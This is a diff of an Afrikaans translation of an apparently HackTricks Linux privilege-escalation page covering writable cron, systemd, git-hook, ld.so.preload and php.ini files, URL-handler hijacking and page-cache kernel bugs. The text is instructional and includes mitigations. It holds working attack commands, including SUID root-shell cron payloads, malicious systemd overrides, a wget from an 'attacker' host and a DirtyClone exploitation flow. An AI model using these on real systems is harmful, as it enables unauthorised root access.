@@ -4,8 +4,8 @@
 
 ### /etc/ld.so.preload
 
-Hierdie lêer gedra hom soos die **`LD_PRELOAD`** omgewingsveranderlike, maar dit werk ook in **SUID binaries**.\
-As jy dit kan skep of wysig, kan jy net 'n **pad na 'n library wat gelaai sal word** met elke uitgevoerde binary byvoeg.
+Hierdie lêer tree op soos die **`LD_PRELOAD`**-env-veranderlike, maar dit werk ook in **SUID binaries**.\
+As jy dit kan skep of wysig, kan jy eenvoudig ’n **pad na ’n library wat gelaai sal word** byvoeg met elke uitgevoerde binary.
 
 Byvoorbeeld: `echo "/tmp/pe.so" > /etc/ld.so.preload`
 ```c
@@ -24,41 +24,41 @@ system("/bin/bash");
 ```
 ### Git hooks
 
-[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) is **scripts** wat op verskeie **events** in 'n git repository **uitgevoer** word, soos wanneer 'n commit geskep word, 'n merge... So as 'n **privileged script or user** hierdie aksies gereeld uitvoer en dit moontlik is om in die `.git`-folder te **skryf**, kan dit gebruik word om **privesc** te doen.
+[**Git hooks**](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks) is **scripts** wat tydens verskeie **events** in ’n git repository **run** word, soos wanneer ’n commit geskep word, ’n merge plaasvind... Dus, as ’n **privileged script or user** hierdie aksies gereeld uitvoer en dit moontlik is om in die **`.git`-folder** te **write**, kan dit vir **privesc** gebruik word.
 
-Byvoorbeeld, dit is moontlik om 'n **script** in 'n git repo in **`.git/hooks`** te genereer sodat dit altyd uitgevoer word wanneer 'n nuwe commit geskep word:
+Byvoorbeeld, dit is moontlik om ’n **script** in ’n git repo in **`.git/hooks`** te **generate**, sodat dit altyd uitgevoer word wanneer ’n nuwe commit geskep word:
 ```bash
 echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/b' > pre-commit
 chmod +x pre-commit
 ```
-### Cron & Time files
+### Cron- en tydlêers
 
-As jy **cron-verwante lêers kan skryf wat root uitvoer**, kan jy gewoonlik code execution kry die volgende keer wat die job loop. Interessante teikens sluit in:
+As jy **cron-verwante lêers kan skryf wat deur root uitgevoer word**, kan jy gewoonlik code execution kry wanneer die taak volgende keer loop. Interessante teikens sluit in:
 
 - `/etc/crontab`
 - `/etc/cron.d/*`
 - `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
 - Root se eie crontab in `/var/spool/cron/` of `/var/spool/cron/crontabs/`
-- `systemd` timers en die services wat hulle trigger
+- `systemd`-timers en die dienste wat hulle aktiveer
 
-Quick checks:
+Vinnige kontroles:
 ```bash
 ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
 find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
 systemctl list-timers --all 2>/dev/null
 grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
 ```
-Tipiese misbruikpaaie:
+Tipiese misbruikspaaie:
 
-- **Voeg 'n nuwe root cron job by** na `/etc/crontab` of 'n lêer in `/etc/cron.d/`
+- **Voeg 'n nuwe root cron job by** `/etc/crontab` of 'n lêer in `/etc/cron.d/`
 - **Vervang 'n script** wat reeds deur `run-parts` uitgevoer word
-- **Plaas 'n backdoor in 'n bestaande timer target** deur die script of binary wat dit begin te wysig
+- **Backdoor 'n bestaande timer-teiken** deur die script of binary wat dit launch te wysig
 
-Minimale cron payload voorbeeld:
+Minimale cron payload-voorbeeld:
 ```bash
 echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
 ```
-As jy net binne ’n cron-gids kan skryf wat deur `run-parts` gebruik word, plaas eerder ’n uitvoerbare lêer daar:
+As jy slegs binne ’n cron-gids wat deur `run-parts` gebruik word, kan skryf, plaas eerder ’n uitvoerbare lêer daar:
 ```bash
 cat > /etc/cron.daily/backup <<'EOF'
 #!/bin/sh
@@ -70,22 +70,22 @@ chmod +x /etc/cron.daily/backup
 ```
 Notas:
 
-- `run-parts` ignoreer gewoonlik lêername wat punte bevat, so verkies name soos `backup` eerder as `backup.sh`.
-- Sommige distros gebruik `anacron` of `systemd` timers in plaas van klassieke cron, maar die misbruik-idee is dieselfde: **wysig wat root later sal uitvoer**.
+- `run-parts` ignoreer gewoonlik lêername wat punte bevat, dus verkies name soos `backup` in plaas van `backup.sh`.
+- Sommige distros gebruik `anacron` of `systemd` timers in plaas van klassieke cron, maar die misbruikidee is dieselfde: **wysig wat root later sal uitvoer**.
 
-### Service & Socket files
+### Diens- en Socket-lêers
 
-As jy **`systemd`** unit files of lêers waarna hulle verwys kan skryf, kan jy moontlik code execution as root kry deur die unit te herlaai en te herbegin, of deur te wag vir die service/socket activation path om te trigger.
+As jy **`systemd` unit files** of lêers waarna hulle verwys kan skryf, kan jy moontlik code execution as root verkry deur die unit te herlaai en te herbegin, of deur te wag dat die service/socket activation path geaktiveer word.
 
-Interessante targets sluit in:
+Interessante teikens sluit in:
 
 - `/etc/systemd/system/*.service`
 - `/etc/systemd/system/*.socket`
 - Drop-in overrides in `/etc/systemd/system/<unit>.d/*.conf`
-- Service scripts/binaries waarna verwys word deur `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
-- Writable `EnvironmentFile=` paths wat deur 'n root service gelaai word
+- Service scripts/binaries waarna `ExecStart=`, `ExecStartPre=`, `ExecStartPost=` verwys
+- Skryfbare `EnvironmentFile=`-paaie wat deur ’n root-service gelaai word
 
-Quick checks:
+Vinnige kontroles:
 ```bash
 ls -la /etc/systemd/system /lib/systemd/system 2>/dev/null
 systemctl list-units --type=service --all 2>/dev/null
@@ -94,12 +94,12 @@ grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /
 ```
 Algemene misbruikpaaie:
 
-- **Oorskryf `ExecStart=`** in ’n root-besitte service unit wat jy kan wysig
-- **Voeg ’n drop-in override by** met ’n kwaadwillige `ExecStart=` en verwyder eers die ou een
-- **Backdoor die script/binary** wat reeds deur die unit verwys word
-- **Hijack ’n socket-activated service** deur die ooreenstemmende `.service`-lêer te wysig wat begin wanneer die socket ’n connection ontvang
+- **Overwrite `ExecStart=`** in a root-owned service unit wat jy kan wysig
+- **Add a drop-in override** met ’n malicious `ExecStart=` en maak eers die ou een leeg
+- **Backdoor the script/binary** waarna die unit reeds verwys
+- **Hijack a socket-activated service** deur die ooreenstemmende `.service`-lêer te wysig wat begin wanneer die socket ’n verbinding ontvang
 
-Voorbeeld van ’n kwaadwillige override:
+Voorbeeld van ’n malicious override:
 ```ini
 [Service]
 ExecStart=
@@ -111,51 +111,51 @@ systemctl daemon-reload
 systemctl restart vulnerable.service
 # or trigger the socket-backed service by connecting to it
 ```
-As jy nie self dienste kan herbegin nie maar wel ’n socket-geaktiveerde unit kan wysig, hoef jy dalk net te **wag vir ’n kliëntverbinding** om uitvoering van die backdoored diens as root te trigger.
+Indien jy nie self dienste kan herbegin nie, maar wel ’n socket-geaktiveerde unit kan wysig, hoef jy dalk net **vir ’n kliëntverbinding te wag** om die uitvoering van die backdoored diens as root te aktiveer.
 
-### Oorskryf ’n beperkende `php.ini` wat deur ’n bevoorregte PHP sandbox gebruik word
+### Oorskryf ’n beperkende `php.ini` wat deur ’n bevoorregte PHP-sandbox gebruik word
 
-Sommige custom daemons valideer user-supplied PHP deur `php` met ’n **restricted `php.ini`** te laat loop (byvoorbeeld, `disable_functions=exec,system,...`). As die sandboxed code steeds **enige write primitive** het (soos `file_put_contents`) en jy kan die **presiese `php.ini` path** bereik wat deur die daemon gebruik word, kan jy daardie config **oorskryf** om restrictions op te hef en dan ’n tweede payload submit wat met elevated privileges loop.
+Sommige pasgemaakte daemons valideer PHP wat deur die gebruiker verskaf word deur `php` met ’n **beperkte `php.ini`** uit te voer (byvoorbeeld, `disable_functions=exec,system,...`). Indien die sandboxed kode steeds oor **enige write primitive** beskik (soos `file_put_contents`) en jy die **presiese `php.ini`-pad** wat deur die daemon gebruik word, kan bereik, kan jy daardie konfigurasie **oorskryf** om beperkings op te hef en daarna ’n tweede payload indien wat met verhoogde privileges uitgevoer word.
 
-Tipiese flow:
+Tipiese vloei:
 
-1. Eerste payload oorskryf die sandbox config.
-2. Tweede payload execute code nou dat dangerous functions weer enabled is.
+1. Die eerste payload oorskryf die sandbox-konfigurasie.
+2. Die tweede payload voer kode uit noudat gevaarlike funksies weer geaktiveer is.
 
-Minimal example (replace the path used by the daemon):
+Minimale voorbeeld (vervang die pad wat deur die daemon gebruik word):
 ```php
 <?php
 file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
 ```
-As die daemon as root loop (of met root-eienaarskap-paaie valideer), gee die tweede uitvoering ’n root-konteks. Dit is in wese **privilege escalation via config overwrite** wanneer die sandboxed runtime steeds lêers kan skryf.
+As die daemon as root loop (of met root-owned paths valideer), lewer die tweede uitvoering ’n root-konteks. Dit is in wese **privilege escalation via config overwrite** wanneer die sandboxed runtime steeds lêers kan skryf.
 
 ### binfmt_misc
 
-Die lêer wat in `/proc/sys/fs/binfmt_misc` geleë is, dui aan watter binary watter tipe lêers moet execute. TODO: check the requirements to abuse this to execute a rev shell when a common file type is open.
+Die lêer wat in `/proc/sys/fs/binfmt_misc` geleë is, dui aan watter binary sekere tipes lêers moet uitvoer. TODO: kontroleer die vereistes om dit te abuse om ’n rev shell uit te voer wanneer ’n algemene lêertipe oopgemaak word.
 
-### Overwrite schema handlers (like http: or https:)
+### Oorskryf schema handlers (soos http: of https:)
 
-’n Aanvaller met skryftoestemmings tot ’n slagoffer se configuration directories kan maklik files vervang of skep wat system behavior verander, wat in unintended code execution lei. Deur die `$HOME/.config/mimeapps.list`-lêer te modify om HTTP en HTTPS URL handlers na ’n malicious file te wys (bv. deur `x-scheme-handler/http=evil.desktop` te stel), verseker die aanvaller dat **clicking any http or https link code trigger wat in daardie `evil.desktop`-lêer gespesifiseer is**. Byvoorbeeld, nadat die volgende malicious code in `evil.desktop` in `$HOME/.local/share/applications` geplaas is, run enige external URL click die embedded command:
+’n Aanvaller met skryftoestemmings tot ’n slagoffer se configuration directories kan maklik lêers vervang of skep wat stelselgedrag verander, wat tot onbedoelde code execution lei. Deur die `$HOME/.config/mimeapps.list`-lêer te wysig sodat HTTP- en HTTPS-URL-handlers na ’n malicious file wys (bv. deur `x-scheme-handler/http=evil.desktop` te stel), verseker die aanvaller dat **die klik van enige http- of https-skakel die code uitvoer wat in daardie `evil.desktop`-lêer gespesifiseer is**. Byvoorbeeld, nadat die volgende malicious code in `evil.desktop` in `$HOME/.local/share/applications` geplaas is, voer enige eksterne URL-klik die ingebedde command uit:
 ```bash
 [Desktop Entry]
 Exec=sh -c 'zenity --info --title="$(uname -n)" --text="$(id)"'
 Type=Application
 Name=Evil Desktop Entry
 ```
-Vir meer inligting kyk [**hierdie pos**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49) waar dit gebruik is om 'n regte kwesbaarheid uit te buit.
+Vir meer inligting, kyk na [**hierdie plasing**](https://chatgpt.com/c/67fac01f-0214-8006-9db3-19c40e45ee49), waar dit gebruik is om ’n werklike kwesbaarheid uit te buit.
 
-### Root executing user-writable scripts/binaries
+### Root wat user-writable scripts/binaries uitvoer
 
-As 'n bevoorregte workflow iets soos `/bin/sh /home/username/.../script` laat loop (of enige binary binne 'n gids wat deur 'n onvoorregte gebruiker besit word), kan jy dit kaap:
+As ’n bevoorregte workflow iets soos `/bin/sh /home/username/.../script` uitvoer (of enige binary binne ’n directory wat deur ’n unprivileged user besit word), kan jy dit hijack:
 
-- **Detect the execution:** monitor prosesse met [pspy](https://github.com/DominicBreuker/pspy) om root te vang wat gebruiker-beheerde paths aanroep:
+- **Bespeur die uitvoering:** monitor prosesse met [pspy](https://github.com/DominicBreuker/pspy) om root op te spoor wanneer dit user-controlled paths aanroep:
 ```bash
 wget http://attacker/pspy64 -O /dev/shm/pspy64
 chmod +x /dev/shm/pspy64
 /dev/shm/pspy64   # wait for root commands pointing to your writable path
 ```
-- **Bevestig skryfbaarheid:** maak seker beide die teikenlêer en sy gids word deur jou gebruiker besit/is skryfbaar.
-- **Kaping van die teiken:** rugsteun die oorspronklike binêre/script en plaas 'n payload wat 'n SUID shell skep (of enige ander root-aksie), en herstel dan toestemmings:
+- **Bevestig skryfbaarheid:** maak seker dat beide die teikenlêer en sy gids deur jou gebruiker besit word en deur jou gebruiker geskryf kan word.
+- **Kaping van die teiken:** maak ’n rugsteun van die oorspronklike binary/script en plaas ’n payload wat ’n SUID-shell skep (of enige ander root-aksie), en herstel dan die toestemmings:
 ```bash
 mv server-command server-command.bk
 cat > server-command <<'EOF'
@@ -166,81 +166,117 @@ chmod 6777 /tmp/rootshell
 EOF
 chmod +x server-command
 ```
-- **Trigger the privileged action** (e.g., pressing a UI button that spawns the helper). When root re-executes the hijacked path, gryp die verhoogde shell met `./rootshell -p`.
+- **Trigger the privileged action** (e.g., pressing a UI button that spawns the helper). Wanneer root die hijacked path weer uitvoer, kry die geëscaleerde shell met `./rootshell -p`.
 
 ### Page-cache-only file modification of privileged binaries
 
-Sommige kernel-bugs verander nie die lêer **op skyf** nie. In plaas daarvan laat hulle jou net die **page cache copy** van ’n leesbare lêer verander. As jy ’n **setuid** of andersins **root-executed** binary kan teiken, kan die volgende uitvoering attacker-controlled bytes uit memory laat loop en privileges verhoog selfs al is die lêerhash op skyf onveranderd.
+Sommige kernel bugs wysig nie die file **op disk** nie. In plaas daarvan laat hulle jou toe om slegs die **page cache copy** van ’n leesbare file te wysig. As jy ’n **setuid**- of andersins **root-executed** binary kan teiken, kan die volgende uitvoering aanvaller-beheerde bytes vanuit memory uitvoer en privileges eskaleer, selfs al is die file hash op disk onveranderd.
 
-Dit is nuttig om hieroor te dink as ’n **runtime-only file write primitive**:
+Dit is nuttig om hieraan te dink as ’n **runtime-only file write primitive**:
 
-- **Disk stays clean**: die inode en on-disk bytes verander nie
-- **Memory is dirty**: processes wat die cached page lees/uitvoer, kry die attacker-gewysigde content
-- **Effect is temporary**: die verandering verdwyn ná reboot of cache eviction
+- **Disk bly skoon**: die inode en bytes op disk verander nie
+- **Memory is dirty**: prosesse wat die cached page lees of uitvoer, kry die aanvaller-gemodifiseerde inhoud
+- **Effek is tydelik**: die verandering verdwyn ná ’n reboot of cache eviction
 
 Hierdie primitive sit tussen klassieke **arbitrary file write** en ouer **page-cache abuse** bugs soos Dirty COW / Dirty Pipe:
 
-- Dirty COW het op ’n race gesteun
-- Dirty Pipe het write-position beperkings gehad
-- ’n page-cache-only primitive kan meer betroubaar wees as die vulnerable path direkte writes in cached file-backed pages gee
+- Dirty COW het op ’n race staatgemaak
+- Dirty Pipe het write-position constraints gehad
+- ’n Page-cache-only primitive kan meer betroubaar wees as die kwesbare path direkte writes na cached file-backed pages verskaf
 
 #### Generic privesc flow
 
 1. Kry ’n kernel primitive wat in **file-backed page cache pages** kan skryf
 2. Gebruik dit teen ’n **readable privileged binary** of ’n ander root-executed file
-3. Trigger execution **before** die page uit die cache verwyder word
-4. Kry code execution as root terwyl die on-disk file nog onveranderd lyk
+3. Trigger execution **voordat** die page uit die cache geëvict word
+4. Kry code execution as root terwyl die file op disk steeds onveranderd lyk
 
 Tipiese hoëwaarde-teikens:
 
 - **setuid-root** binaries
-- Helpers wat deur **root services** gelanseer word
-- Binaries wat algemeen uit **containers sharing the host kernel/page cache** uitgevoer word
+- Helpers wat deur **root services** geloods word
+- Binaries wat algemeen vanuit **containers wat die host kernel/page cache deel** uitgevoer word
 
 #### AF_ALG + `splice()` example path
 
-Copy Fail (CVE-2026-31431) is ’n goeie voorbeeld van hierdie klas. Die vulnerable path was in die Linux crypto userspace API (`AF_ALG` / `algif_aead`):
+Copy Fail (CVE-2026-31431) is ’n goeie voorbeeld van hierdie klas. Die kwesbare path was in die Linux crypto userspace API (`AF_ALG` / `algif_aead`):
 
-- `splice()` kan verwysings na page-cache pages van ’n leesbare file na die crypto TX scatterlist skuif
-- die in-place `algif_aead` decrypt path het source en destination buffers hergebruik
-- `authencesn` het toe in die destination tag region geskryf
-- wanneer daardie region nog na gespliced file-backed pages verwys het, het die write in die **page cache of the target file** geland
+- `splice()` kan references na page-cache pages van ’n leesbare file na die crypto TX scatterlist verskuif
+- die in-place `algif_aead` decrypt path het source- en destination-buffers hergebruik
+- `authencesn` het daarna in die destination tag region geskryf
+- wanneer daardie region steeds na spliced file-backed pages verwys het, het die write in die **page cache van die target file** beland
 
-So die interessante technique is nie die CVE self nie, maar die pattern:
+Die interessante technique is dus nie die CVE self nie, maar die pattern:
 
 - **feed file-backed cache pages into a kernel subsystem**
-- laat die subsystem hulle as writable output **treat**
+- laat die subsystem hulle as writable output **behandel**
 - trigger ’n klein, beheerde overwrite in memory
 
-Die public PoC het herhaalde **4-byte writes** gebruik om `/usr/bin/su` in memory te patch en dit dan uitgevoer.
+Die publieke PoC het herhaalde **4-byte writes** gebruik om `/usr/bin/su` in memory te patch en dit daarna uit te voer.
 
-#### Exposure and hunting
+#### ESP / XFRM + netfilter TEE clone example path
 
-As jy hierdie klas bug vermoed, vertrou nie net op disk integrity checks nie. Verifieer ook:
+DirtyClone (CVE-2026-43503) wys nog ’n variant van dieselfde **page-cache-only write-to-root** pattern, maar hierdie keer is die sink **IPsec ESP decrypt** in plaas van `AF_ALG`.
+
+Die belangrike technique is die **metadata-laundering step**:
+
+- `splice()` plaas ’n **read-only file-backed page-cache page** in ’n ESP-in-UDP packet
+- die oorspronklike DirtyFrag mitigation het daardie skb met `SKBFL_SHARED_FRAG` gemerk sodat `esp_input()` sou **copy voordat dit decrypt**
+- netfilter `TEE` dupliseer die packet deur `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
+- die clone behou dieselfde fisiese page-cache reference, maar verloor `SKBFL_SHARED_FRAG`
+- `esp_input()` behandel die clone dan as veilig en voer **in-place `cbc(aes)` decrypt** oor die file-backed page uit
+
+Die reviewer-les is breër as die CVE: as ’n mitigation van **skb/page metadata** afhang om te besluit of ’n operasie eers moet copy, kan enige **clone/copy path wat die backing page behou maar die metadata laat val** die write primitive stilweg heropen.
+
+Tipiese exploitation flow:
+
+1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` om **`CAP_NET_ADMIN` binne ’n private network namespace** te verkry
+2. bring loopback op en installeer ’n **netfilter `TEE` rule** in `mangle/OUTPUT`
+3. installeer **XFRM ESP transport SAs** via `NETLINK_XFRM`
+4. encode elke target 4-byte word in die SA `seq_hi` field (DirtyFrag se word-selection trick)
+5. stuur die spliced ESP-in-UDP packet sodat die **TEE clone** `esp_input()` bereik en **in place** decrypt
+6. herhaal totdat die page-cache copy van `/usr/bin/su` of ’n ander privileged executable attacker-controlled code bevat
+
+Operasioneel is die impak dieselfde as in die `AF_ALG`-voorbeeld: die file op disk bly skoon, maar `execve()` gebruik die **gemuteerde page-cache bytes** en lewer root.
+
+Nuttige exposure checks vir hierdie variant:
+```bash
+unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
+sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
+modprobe -n -v xt_TEE 2>/dev/null
+modprobe -n -v esp4 2>/dev/null
+modprobe -n -v esp6 2>/dev/null
+lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
+```
+Korttermyn-attack-surface-reduction is ook hier path-specific: opgradering na 'n kernel wat `48f6a5356a33` bevat, herstel die clone path, terwyl die blokkering van `xt_TEE`-autoload die **flag-laundering step** verwyder en die blokkering van `esp4` / `esp6` die **decrypt sink** verwyder.
+
+#### Exposure en hunting
+
+As jy hierdie klas fout vermoed, moenie net op disk integrity checks staatmaak nie. Verifieer ook:
 ```bash
 uname -r
 grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
 lsmod | grep algif_aead
 find / -perm -4000 -type f 2>/dev/null
 ```
-- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` kan as 'n module gelaai/afgelaai word
-- `CONFIG_CRYPTO_USER_API_AEAD=y`: die koppelvlak is in die kernel ingebou
-- setuid binaries is goeie teikens omdat 'n page-cache-only patch genoeg kan wees om 'n local foothold na root te verander
+- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` kan as ’n module gelaai/ontlaai word
+- `CONFIG_CRYPTO_USER_API_AEAD=y`: die interface is in die kernel ingebou
+- setuid binaries is goeie teikens omdat ’n page-cache-only patch genoeg kan wees om ’n plaaslike foothold in root te verander
 
-#### Aanvalsoppervlak-vermindering vir die `algif_aead`-pad
+#### Vermindering van die aanvalsvlak vir die `algif_aead`-pad
 
-As die kwesbare koppelvlak deur 'n laaibare module verskaf word:
+As die kwesbare interface deur ’n laaibare module verskaf word:
 ```bash
 echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
 rmmod algif_aead 2>/dev/null || true
 ```
-As dit in die kernel saamgestel is, het sommige disclosures berig dat die init-pad geblokkeer word met:
+Indien dit in die kernel gekompileer is, het sommige disclosures gerapporteer dat die init-pad geblokkeer word met:
 ```bash
 initcall_blacklist=algif_aead_init
 ```
-Hierdie soort mitigering is ook die moeite werd om te onthou vir ander kernel LPEs: as exploitation afhang van ’n spesifieke opsionele interface, kan die deaktivering of blacklisting van daardie interface die exploit path breek selfs voordat ’n volledige kernel-opgradering beskikbaar is.
+Hierdie soort mitigation is ook die moeite werd om vir ander kernel LPEs te onthou: indien exploitation van ’n spesifieke optional interface afhang, kan die disabling of blacklisting van daardie interface die exploit path breek selfs voordat ’n volledige kernel upgrade beskikbaar is.
 
-## References
+## Verwysings
 
 - [HTB Bamboo – hijacking a root-executed script in a user-writable PaperCut directory](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
 - [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
@@ -249,5 +285,9 @@ Hierdie soort mitigering is ook die moeite werd om te onthou vir ander kernel LP
 - [Linux stable fix: crypto: algif_aead - Revert to operating out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
 - [Copy Fail advisory](https://copy.fail/)
 - [Theori / Xint technical writeup](https://xint.io/blog/copy-fail-linux-distributions)
+- [DirtyClone repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
+- [JFrog: Dissecting and Exploiting Linux LPE Variant DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
+- [Linux fix: net: skb: preserve `SKBFL_SHARED_FRAG` in `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
+- [Linux earlier mitigation: set `SKBFL_SHARED_FRAG` for spliced UDP packets (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
 
 {{#include ../../banners/hacktricks-training.md}}
